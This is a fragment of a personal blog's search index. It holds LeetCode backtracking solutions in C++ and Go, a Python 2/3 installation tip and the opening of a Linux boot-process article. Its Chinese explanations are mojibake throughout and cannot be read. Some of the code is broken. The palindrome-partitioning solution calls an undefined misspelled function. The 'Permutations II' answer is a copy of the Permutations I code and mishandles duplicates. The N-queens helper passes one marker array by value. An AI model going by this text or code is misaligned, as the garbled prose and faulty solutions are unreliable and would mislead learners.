&lt;p&gt;åŒä¸€å±‚ä¸Šçš„å…ƒç´ ï¼Œå°±æ˜¯åŒä¸€ä¸ªforå¾ªç¯ä¸­ï¼Œä¹Ÿå°±æ˜¯å¦‚æœè¯¥forå¾ªç¯ç”¨è¿‡äº†æŸä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆåº”è¯¥æ ‡è®°ä¸€ä¸‹å®ƒï¼Œä¸‹æ¬¡å†åˆ°å®ƒæ—¶å°±è·³è¿‡ã€‚ä½†æ˜¯éœ€è¦å…ˆæ’åºã€‚åŸå› æ˜¯ï¼šä¾‹å¦‚1ï¼Œ7ï¼Œ1ï¼Œtarget=8ï¼Œå¦‚æœä¸æ’åºï¼Œå°±ç®—åœ¨ä¸€ä¸ªforå¾ªç¯ä¸­æ ‡æ³¨äº†1ä½¿ç”¨è¿‡ï¼Œè¿˜æ˜¯ä¼šæœ‰é‡å¤çš„[1,7]å’Œ[7,1]ï¼ŒåŸå› æ˜¯è™½ç„¶1æ ‡æ³¨ä½¿ç”¨è¿‡ï¼Œä½†æ˜¯å¦‚æœ7å¼€å¤´æ—¶ï¼Œé€’å½’ä¸‹å»ä¹‹åï¼Œä¸‹ä¸€å±‚çš„forå¾ªç¯å¯¹1è¿˜æ˜¯æ²¡æœ‰æ ‡æ³¨ä½¿ç”¨è¿‡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combinationSum2(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target) {
        sort(candidates.begin(), candidates.end());
        backtracking(candidates, target, 0, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target, int sum, int index) {
        if(sum &amp;gt; target) return ;
        if (sum == target) {
            res.push_back(tmpres);
            return ;
        }
        int used[101] = {0};
        for (int i = index; i &amp;lt; candidates.size(); i ++) {
            if (used[candidates[i]]) continue;
            used[candidates[i]] = 1;
            tmpres.push_back(candidates[i]);
            backtracking(candidates, target, sum + candidates[i], i + 1);
            tmpres.pop_back();
        }
        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;åˆ†å‰²å›æ–‡ä¸²&#34;&gt;åˆ†å‰²å›æ–‡ä¸²â€»&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/palindrome-partitioning/&lt;/p&gt;
&lt;p&gt;åˆ‡å‰²å­—ç¬¦ä¸²å…¶å®å’Œç»„åˆé—®é¢˜ç›¸ä¼¼ï¼Œå¯¹äºå­—ç¬¦ä¸²abcdefï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç»„åˆé—®é¢˜ï¼šé€‰å–ä¸€ä¸ªaä¹‹åï¼Œåœ¨bcdefä¸­å†é€‰å–ç¬¬äºŒä¸ªï¼Œé€‰å–bä¹‹ååœ¨cdefä¸­é€‰ç¬¬ä¸‰ä¸ª...&lt;/li&gt;
&lt;li&gt;åˆ‡å‰²é—®é¢˜ï¼šåˆ‡å‰²ä¸€ä¸ªaä¹‹åï¼Œåœ¨bcdefä¸­å†åˆ‡å‰²ç¬¬äºŒæ®µï¼Œç„¶ååˆ‡å‰²ç¬¬ä¸‰æ®µ...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å”¯ä¸€ä¸åŒç‚¹åœ¨äºï¼Œåœ¨åˆ‡å‰²å‰éœ€è¦åˆ¤æ–­ä¸€ä¸‹å¾…åˆ‡å‰²çš„å­—ç¬¦ä¸²æ˜¯ä¸æ˜¯å›æ–‡ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºæ¯ä¸€å±‚é€’å½’ï¼ŒstartIndexä»£è¡¨èµ·å§‹å­—ç¬¦ï¼Œç„¶åçœ‹s[startIndex, i]æ˜¯ä¸æ˜¯å›æ–‡ï¼Œå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°±å°†å…¶æˆªå–ï¼Œè¿›å…¥ä¸‹ä¸€å±‚é€’å½’ï¼Œèµ·å§‹å­—ç¬¦æ˜¯i+1ï¼Œå¦‚æœs[startIndex, i]ä¸æ˜¯å›æ–‡ï¼Œé‚£å°±æ¥ç€åˆ¤æ–­s[startIndex, i+1]æ˜¯ä¸æ˜¯å›æ–‡...&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; ans;
    vector&amp;lt;string&amp;gt; tmpans;
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; partition(string s) {
        backtrancing(s, 0);
        return ans;
    }

    void backtracking(string s, int startIndex) {
        if (startIndex == s.length()) {
            ans.push_back(tmpans);
            return ;
        }
        for (int i = startIndex; i &amp;lt; s.length(); i ++) {
            if (isH(s, startIndex, i)) {
                tmpans.push_back(s.substr(startIndex, i - startIndex + 1));
                backtrancing(s, i + 1);
            }
            else continue;
            tmpans.pop_back();
        }
    }


    bool isH(string str, int start, int end) {
        int len = str.length();
        for (int i = start, j = end; i &amp;lt;= j; i ++, j --) {
            if(str[i] != str[j]) return false;
        }
        return true;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;å¤åŸipåœ°å€&#34;&gt;å¤åŸIPåœ°å€&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/restore-ip-addresses/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜å…¶å®ä¹Ÿæ˜¯å­—ç¬¦ä¸²åˆ†å‰²é—®é¢˜ï¼Œåªä¸è¿‡ç›¸æ¯”å›æ–‡åˆ†å‰²æ¥è¯´ï¼Œé™åˆ¶çš„æ¡ä»¶å‘ç”Ÿäº†å˜åŒ–ï¼Œè¿™æ¬¡æ˜¯çœ‹åˆ†å‰²çš„å­—ä¸²æ˜¯ä¸æ˜¯åˆæ³•çš„ipåœ°å€èŒƒå›´ï¼Œåªéœ€è¦åœ¨æ¯æ¬¡åˆ†å‰²ä¹‹å‰åˆ¤æ–­æ˜¯å¦ç¬¦åˆæ¡ä»¶å³å¯ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; res;
    vector&amp;lt;string&amp;gt; ip;
    vector&amp;lt;string&amp;gt; restoreIpAddresses(string s) {
        if(s.length() &amp;gt; 16) return res;
        backtracking(s, 0);
        return res;
    }

    void backtracking(string s, int startIndex) {
        if(ip.size() &amp;gt; 4) return;
        if (startIndex == s.length() &amp;amp;&amp;amp; ip.size() == 4) {
            string tmp = ip[0];
            for (int i = 1; i &amp;lt; 4; i ++) {
                tmp += &amp;quot;.&amp;quot; + ip[i];
            }
            res.push_back(tmp);
            return ;
        }
        for (int i = startIndex; i &amp;lt; s.length(); i++) {
            string substr = s.substr(startIndex, i - startIndex + 1);
            if(substr.length() &amp;gt; 1 &amp;amp;&amp;amp; substr[0] == &#39;0&#39; || substr.length() &amp;gt; 3) break;
            int subnum = toInt(substr);
            if (subnum &amp;gt;= 0 &amp;amp;&amp;amp; subnum &amp;lt;= 255) {
                ip.push_back(substr);
                backtracking(s, i + 1);
            }
            else break;
            ip.pop_back();
        }
    }

    int toInt(string str) {
        int res = 0;
        for (int i = 0; i &amp;lt; str.length(); i ++) {
            res = res * 10 + str[i] - &#39;0&#39;;
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;å­é›†&#34;&gt;å­é›†&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/subsets/&lt;/p&gt;
&lt;p&gt;æ€ä¹ˆè¯´ï¼Œå°±å¾ˆç®€å•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; subsets(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums, int startIndex) {
        res.push_back(tmpres);
        for (int i = startIndex ; i &amp;lt; nums.size(); i ++) {
            tmpres.push_back(nums[i]);
            backtracking(nums, i + 1);
            tmpres.pop_back();
        }
        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;å­é›†ii&#34;&gt;å­é›†â…¡â€»&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/subsets-ii/&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåŒºåˆ«æ˜¯numsæ•°ç»„ä¸­æœ‰é‡å¤å…ƒç´ äº†ï¼Œé‚£ä¹ˆè¿™æ ·å°±åˆå¯èƒ½é€‰åˆ°é‡å¤çš„å­é›†ï¼Œé‚£ä¹ˆè¿™ç§é‡å¤æ˜¯ä¹‹å‰é‡åˆ°çš„ï¼Œåœ¨å›æº¯çš„æ ‘å½¢ç»“æ„ä¸­ï¼ŒåŒä¸€å±‚å¦‚æœå‡ºç°åŒä¸€å…ƒç´ ï¼Œé‚£ä¹ˆç»“æœå¿…ç„¶ä¼šæœ‰é‡å¤çš„ï¼Œå› æ­¤éœ€è¦å»æ‰åŒå±‚ä¹‹é—´çš„é‡å¤å…ƒç´ ï¼Œæ‰€ä»¥å»é‡çš„æ–¹æ³•å°±æ˜¯åœ¨æ¯ä¸€å±‚é€’å½’ä¸­è®°å½•ä¸€ä¸‹éå†è¿‡çš„å…ƒç´ ï¼Œå¦‚æœä¸‹ä¸€ä¸ªå…ƒç´ å·²ç»éå†è¿‡äº†é‚£ä¹ˆå°±ç›´æ¥è·³è¿‡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; subsetsWithDup(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        sort(nums.begin(), nums.end());
        backtracking(nums, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums, int startIndex) {
        res.push_back(tmpres);
        map&amp;lt;int, bool&amp;gt; flag;
        for (int i = startIndex ; i &amp;lt; nums.size(); i ++) {
            if (flag[nums[i]] == 0) {
                flag[nums[i]] = 1;
                tmpres.push_back(nums[i]);
                backtracking(nums, i + 1);
                tmpres.pop_back();
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;é€’å¢å­åºåˆ—&#34;&gt;é€’å¢å­åºåˆ—&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/increasing-subsequences/&lt;/p&gt;
&lt;p&gt;å°±å¾ˆç®€å•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; findSubsequences(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums, int startIndex) {
        if (tmpres.size() &amp;gt; 1) {
            res.push_back(tmpres);
        }
        map&amp;lt;int, bool&amp;gt; flag;
        for (int i = startIndex; i &amp;lt; nums.size(); i++) {
            if (flag[nums[i]] != 1) {
                if (tmpres.size() == 0 || nums[i] &amp;gt;= tmpres[tmpres.size() - 1]) {
                    tmpres.push_back(nums[i]);
                    flag[nums[i]] = 1;
                    backtracking(nums, i + 1);
                }
                else continue;
                tmpres.pop_back();
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;å…¨æ’åˆ—&#34;&gt;å…¨æ’åˆ—&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/permutations/&lt;/p&gt;
&lt;p&gt;åƒè¿™ç§å»é‡å°±æ˜¯ä¸€ä¸ªæ ‘æä¸Šçš„é‡å¤å…ƒç´ ï¼Œéœ€è¦ä¸€ä¸ªå…¨å±€çš„æ ‡è®°ï¼Œå¦‚æœæŸä¸ªå…ƒç´ å·²ç»é€‰ä¸Šäº†ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å†ç”¨äº†ï¼Œå³ä¸€ä¸ªå…ƒç´ åªèƒ½è¢«é€‰ä¸€æ¬¡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    map&amp;lt;int, bool&amp;gt; flag;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; permute(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        if (tmpres.size() == nums.size()) {
            res.push_back(tmpres);
            return ;
        }
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            if (flag[nums[i]] != 1) {
                flag[nums[i]] = 1;
                tmpres.push_back(nums[i]);
                backtracking(nums);
                tmpres.pop_back();
                flag[nums[i]] = 0;
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;å…¨æ’åˆ—ii&#34;&gt;å…¨æ’åˆ—â…¡â€»&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/permutations-ii/submissions/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜ä¸­ï¼Œæ•°ç»„å‡ºç°äº†é‡å¤å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯è¯´åŒå±‚ä¹‹é—´éœ€è¦å»é™¤é‡å¤å€¼å…ƒç´ ï¼Œä¸€ä¸ªå­æ ‘ä¸­è¦å»é™¤åŒä¸€ä¸ªä¸‹æ ‡å…ƒç´ (ä¸€ä¸ªä¸‹æ ‡åªèƒ½è¢«é€‰ä¸€æ¬¡)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    map&amp;lt;int, bool&amp;gt; flag;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; permute(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        backtracking(nums);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        if (tmpres.size() == nums.size()) {
            res.push_back(tmpres);
            return ;
        }
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            if (flag[nums[i]] != 1) {
                flag[nums[i]] = 1;
                tmpres.push_back(nums[i]);
                backtracking(nums);
                tmpres.pop_back();
                flag[nums[i]] = 0;
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;é‡æ–°å®‰æ’è¡Œç¨‹&#34;&gt;é‡æ–°å®‰æ’è¡Œç¨‹â€»&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/reconstruct-itinerary/&lt;/p&gt;
&lt;p&gt;ä¸€é¡¿æ“ä½œçŒ›å¦‚è™ï¼Œä¸€çœ‹å‡»è´¥ç™¾åˆ†äº”&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜æœ‰äº›éš¾åº¦ï¼Œä¸»è¦æ˜¯æ€ä¹ˆå°†ticketsè½¬æ¢æˆæ¯”è¾ƒå®¹æ˜“è®¡ç®—åˆ¤æ–­çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥ç›´æ¥ç”¨unordered_map&amp;lt;string, map&amp;lt;string, int&amp;gt;è¡¨ç¤ºä»æºåˆ°ç›®çš„æœºç¥¨æ•°é‡ï¼Œåˆ©ç”¨mapçš„è‡ªåŠ¨æ’åºå¯ä»¥å®Œæˆé¢˜ç›®è¦æ±‚çš„å­—å…¸é¡ºåºã€‚&lt;/p&gt;
&lt;p&gt;åŸºæœ¬æ€è·¯å°±æ˜¯æ¯åˆ°è¾¾ä¸€ä¸ªåœ°æ–¹å°±æŸ¥çœ‹å¯ä»¥å‰å¾€ä¸‹ä¸€ä¸ªåœ°æ–¹çš„æ‰€æœ‰è½¦ç¥¨ï¼Œå› ä¸ºç”¨mapå­˜å‚¨ï¼Œæ‰€ä»¥æ˜¯æŒ‰ç…§å­—å…¸åºæ’åˆ—å¥½çš„ï¼Œç”¨è¿‡çš„è½¦ç¥¨ä¸èƒ½å†ç”¨ï¼Œæ‰€ä»¥éœ€è¦å°†è½¦ç¥¨æ•°é‡å‡1ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; tmpans;
    unordered_map&amp;lt;string, map&amp;lt;string, int&amp;gt;&amp;gt; mytickets;
    vector&amp;lt;string&amp;gt; findItinerary(vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt;&amp;amp; tickets) {
        
        for (int i = 0; i &amp;lt; tickets.size(); i++ ) {
            mytickets[tickets[i][0]][tickets[i][1]] ++ ;
        }
        tmpans.push_back(&amp;quot;JFK&amp;quot;);
        backtracking(tickets, &amp;quot;JFK&amp;quot;);

        return tmpans;
    }

    void backtracking(vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; tickets, string current) {
        if (tmpans.size() == tickets.size() + 1) return ;

        for (auto it = mytickets[current].begin(); it != mytickets[current].end() ; it ++) {
            if (it-&amp;gt;second &amp;gt; 0) {
                it-&amp;gt;second --;
                tmpans.push_back(it-&amp;gt;first);
                backtracking(tickets, it-&amp;gt;first);
                if (tmpans.size() == tickets.size() + 1) return ;
                tmpans.pop_back();
                it-&amp;gt;second ++;
            }
            
        }

    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;nçš‡å&#34;&gt;nçš‡åâ€»&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/n-queens/&lt;/p&gt;
&lt;p&gt;ä¸€é¡¿æ“ä½œ...&lt;/p&gt;
&lt;p&gt;å¦‚æœä¸€ä¸ªç‚¹æœ‰çš‡åï¼Œé‚£ä¹ˆå®ƒçš„è¯¥è¡Œã€è¯¥åˆ—ã€å¯¹è§’è¡Œå’Œé¥­å¯¹è§’è¡Œéƒ½ä¸èƒ½æœ‰çš‡åï¼Œéš¾ç‚¹å°±åœ¨äºæ€ä¹ˆå»è¡¨ç¤ºiè¡Œjåˆ—è¿™ä¸ªç‚¹æ‰€å½±å“çš„è¡Œåˆ—å’Œå¯¹è§’ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œéœ€è¦ç”¨å››ä¸ªæ•°ç»„åˆ†åˆ«è¡¨ç¤ºiè¡Œjåˆ—æ‰€åœ¨çš„è¡Œã€åˆ—ã€å¯¹è§’è¡Œã€åå¯¹è§’è¡Œï¼š&lt;/p&gt;
&lt;p&gt;ä»¥ç¬¬iè¡Œã€ç¬¬jåˆ—ä¸ºä¾‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;row[i]&lt;/li&gt;
&lt;li&gt;col[j]&lt;/li&gt;
&lt;li&gt;xie[n-(i-j)-1]&lt;/li&gt;
&lt;li&gt;backxie[i+j]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç®€å•æ¨ä»¥ä¸‹å°±èƒ½å¾—å‡ºã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; res;
    vector&amp;lt;string&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;string&amp;gt;&amp;gt; solveNQueens(int n) {
        vector&amp;lt;int&amp;gt; row(n, 0);
        vector&amp;lt;int&amp;gt; col(n, 0);
        vector&amp;lt;int&amp;gt; xie(2 * n - 1, 0);
        vector&amp;lt;int&amp;gt; backxie(2 * n - 1, 0);
        string tmp = &amp;quot;&amp;quot;;
        for (int i = 0; i &amp;lt; n; i ++) {
            tmp += &#39;.&#39;;
        }
        for (int i = 0; i &amp;lt; n; i ++) {
            tmpres.push_back(tmp);
        }
        backtracking(n, row, col, xie, backxie, 0, 0);
        
        return res;

    }

    void backtracking(int n, vector&amp;lt;int&amp;gt;&amp;amp; row, vector&amp;lt;int&amp;gt;&amp;amp; col, vector&amp;lt;int&amp;gt;&amp;amp; xie, vector&amp;lt;int&amp;gt; backxie, int k, int cnt) {
        if (cnt == n) {
            res.push_back(tmpres);
            return ;
        }

        for (int i = k; i &amp;lt; n; i++) {
            for (int j = 0; j &amp;lt; n; j++) {
                if(row[i] != 1 &amp;amp;&amp;amp; col[j] != 1 &amp;amp;&amp;amp; xie[n - (i - j) - 1] != 1 &amp;amp;&amp;amp; backxie[i + j] != 1) {
                    row[i] = 1;
                    col[j] = 1;
                    xie[n - (i - j) - 1] = 1;
                    backxie[i + j] = 1;
                    tmpres[i][j] = &#39;Q&#39;;
                    backtracking(n, row, col, xie, backxie, i + 1, cnt + 1);
                    tmpres[i][j] = &#39;.&#39;;
                    row[i] = 0;
                    col[j] = 0;
                    xie[n - (i - j) - 1] = 0;
                    backxie[i + j] = 0;
                }
            }
           
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;è§£æ•°ç‹¬&#34;&gt;è§£æ•°ç‹¬&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/sudoku-solver/&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªç›¸æ¯”äºNçš‡åé—®é¢˜ï¼Œä¸åŒç‚¹åœ¨äºï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åªæœ‰ä¸€ä¸ªè§£ï¼Œæ‰€ä»¥å›æº¯å‡½æ•°ä¸€æ—¦æ‰¾åˆ°è§£ä¹‹åå°±åº”è¯¥ç«‹å³è¿”å›ï¼Œå› æ­¤é€’å½’çš„å‡ºå£éœ€è¦å†™æ¸…æ¥š&lt;/li&gt;
&lt;li&gt;ä»ä¸€ä¸ªçš‡åå‡çº§åˆ°äº†9ä¸ªä¸åŒçš„çš‡å&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func solveSudoku(board [][]byte)  {
    var numrow [9][10] int
    var numcol [9][10] int
    var num9 [9][10] int
    var backtracking func(board [][]byte) int 

    for i := 0; i &amp;lt; 9; i++ {
        for j := 0; j &amp;lt; 9; j++ {
            if board[i][j] != &#39;.&#39; {
                numrow[i][board[i][j] - &#39;0&#39;] = 1
                numcol[j][board[i][j] - &#39;0&#39;] = 1
                num9[i / 3 * 3 + j / 3][board[i][j] - &#39;0&#39;] = 1
                continue
            }
        }
    }
    
    backtracking = func(board [][]byte) int {
        for i := 0; i &amp;lt; 9; i++ {
            for j := 0; j &amp;lt; 9; j++ {
                if board[i][j] == &#39;.&#39; {
                    for k := 1; k &amp;lt;= 9; k++ {
                        if numrow[i][k] == 0 &amp;amp;&amp;amp; numcol[j][k] == 0 &amp;amp;&amp;amp; num9[i / 3 * 3 + j / 3][k] == 0 {
                            numrow[i][k] = 1
                            numcol[j][k] = 1
                            num9[i / 3 * 3 + j / 3][k] = 1
                            board[i][j] = byte(k + &#39;0&#39;)
                            if backtracking(board) == 1 {
                                return 1
                            }
                            numrow[i][k] = 0
                            numcol[j][k] = 0
                            num9[i / 3 * 3 + j / 3][k] = 0
                            board[i][j] = &#39;.&#39;
                        }
                    }
                    return 0
                }
            }
        }
        return 1
    }
    backtracking(board)
}
&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘å›æº¯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/tong-shi-an-zhuang-python2pip2he-python3pip3/"" data-c="
          &lt;p&gt;åœ¨å®˜ç½‘æ­£å¸¸ä¸‹è½½python2å’Œpython3å®‰è£…åŒ…å®‰è£…ï¼Œç„¶ååœ¨ç¯å¢ƒå˜é‡çš„pathä¸‹æ·»åŠ å®‰è£…çš„ä½ç½®ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Program Files\Python27\
C:\Program Files\Python27\Scripts\
C:\Program Files\Python39\
C:\Program Files\Python39\Scripts\
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†Python39ä¸‹çš„python.exeé‡å‘½åä¸ºpython3.exe&lt;br&gt;
å°†Python39\Scripts\ä¸‹çš„pip.exeåˆ æ‰ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢åœ¨cmdä¸­pythonå³ä¸ºpython2ï¼Œpython3å³ä¸ºpython3ï¼Œpipå’Œpip3ä¹ŸåŒç†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœpip3æç¤ºï¼š&lt;code&gt;Fatal error in launcher: Unable to create process using &#39;&amp;quot;c:\program files\python39\python.exe&amp;quot;&lt;/code&gt;&lt;br&gt;
å°±é‡æ–°å‡çº§ä¸€äº›pip3ï¼š&lt;code&gt;python3 -m pip install --upgrade pip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœpython2ç›®å½•ä¸‹æ²¡æœ‰Scriptsç›®å½•ï¼Œåˆ™éœ€è¦å®‰è£…ä¸€äº›pipï¼š&lt;code&gt;python -m ensurepip&lt;/code&gt;&lt;/p&gt;
">åŒæ—¶å®‰è£…python2(pip2)å’Œpython3(pip3)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-00linux-qi-dong-guo-cheng/"" data-c="
          &lt;h3 id=&#34;1postå¼€æœºè‡ªæ£€&#34;&gt;1.POSTå¼€æœºè‡ªæ£€&lt;/h3&gt;
&lt;p&gt;linuxå¼€æœºåŠ ç”µåï¼Œç³»ç»Ÿå¼€å§‹å¼€æœºè‡ªæ£€ï¼Œè¯¥è¿‡ç¨‹ä¸»è¦å¯¹è®¡ç®—æœºå„ç§ç¡¬ä»¶è®¾å¤‡è¿›è¡Œæ£€æµ‹ï¼Œå¦‚CPUã€å†…å­˜ã€ä¸»æ¿ã€ç¡¬ç›˜ã€CMOSèŠ¯ç‰‡ç­‰ï¼Œå¦‚æœå‡ºç°è‡´å‘½æ•…éšœåˆ™åœæœºï¼Œå¹¶ä¸”ç”±äºåˆå§‹åŒ–è¿‡ç¨‹è¿˜æ²¡å®Œæˆï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°ä»»ä½•æç¤ºä¿¡å·ï¼›å¦‚æœå‡ºç°ä¸€èˆ¬æ•…éšœåˆ™ä¼šå‘å‡ºå£°éŸ³ç­‰æç¤ºä¿¡å·ï¼Œç­‰å¾…æ•…éšœæ¸…é™¤ï¼›è‹¥æœªå‡ºç°æ•…éšœï¼ŒåŠ ç”µè‡ªæ£€å®Œæˆã€‚&lt;/p&gt;
&lt;h3 id=&#34;2åŠ è½½bios&#34;&gt;2.åŠ è½½BIOS&lt;/h3&gt;
&lt;p&gt;å¼€æœºè‡ªæ£€å®Œæˆåï¼ŒCPUé¦–å…ˆè¯»å–ä½äºCMOSä¸­çš„BIOSç¨‹åºï¼ŒæŒ‰ç…§BIOSä¸­è®¾å®šçš„å¯åŠ¨æ¬¡åºï¼ˆBoot Sequence)é€ä¸€æŸ¥æ‰¾å¯å¯åŠ¨è®¾å¤‡ï¼Œæ‰¾åˆ°å¯å¯åŠ¨çš„è®¾å¤‡åï¼Œå»è¯¥è®¾å¤‡çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºä¸­è¯»å–ä¸»å¼•å¯¼ç›®å½•ï¼ˆMBRï¼‰ï¼Œé‚£ä¹ˆMBRæ˜¯ä»€ä¹ˆï¼Ÿå®ƒåˆæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ&lt;/p&gt;
&lt;p&gt;MBRå­˜åœ¨äºå¯å¯åŠ¨ç£ç›˜çš„0ç£é“0æ‰‡åŒºï¼Œå ç”¨512å­—èŠ‚ï¼Œå®ƒä¸»è¦ç”¨æ¥å‘Šè¯‰è®¡ç®—æœºä»é€‰å®šçš„å¯å¯åŠ¨è®¾å¤‡çš„å“ªä¸ªåˆ†åŒºæ¥åŠ è½½å¼•å¯¼åŠ è½½ç¨‹åºï¼ˆBoot loader)ï¼ŒMBRä¸­å­˜åœ¨å¦‚ä¸‹å†…å®¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Boot Loader å ç”¨446å­—èŠ‚ï¼Œå­˜å‚¨æœ‰æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰ç›¸å…³ä¿¡æ¯ï¼Œå¦‚æ“ä½œç³»ç»Ÿåç§°ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸ä½ç½®ç­‰ï¼Œå®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯åŠ è½½å†…æ ¸åˆ°å†…å­˜ä¸­è¿è¡Œã€‚&lt;/li&gt;
